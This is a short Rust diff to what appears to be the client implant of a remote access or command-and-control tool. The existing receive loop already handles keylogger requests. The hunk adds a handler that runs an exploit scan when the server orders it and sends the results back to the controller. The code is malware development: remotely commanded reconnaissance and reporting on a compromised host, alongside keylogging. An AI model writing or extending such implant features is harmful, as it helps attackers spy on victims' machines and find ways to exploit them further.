@@ -541,6 +541,14 @@ impl MultiplexManager {
                 Packets::KeyloggerRequest(req) => {
                     self.handle_keylogger_request(&req)?;
                 }
+                Packets::ExploitScanRequest(scan_req) => {
+                    eprintln!("Scan request received from server");
+                    let exploit_data = crate::exploit_scanner::run_scan(&scan_req);
+                    eprintln!("Scan complete: {} exploits found", exploit_data.exploits.len());
+                    if let Err(e) = self.send_packet(&exploit_data.serialize()?) {
+                        eprintln!("Failed to send exploit data: {e}");
+                    }
+                }
                 _ => {
                     eprintln!("Unexpected packet in multiplex receive loop");
                 }
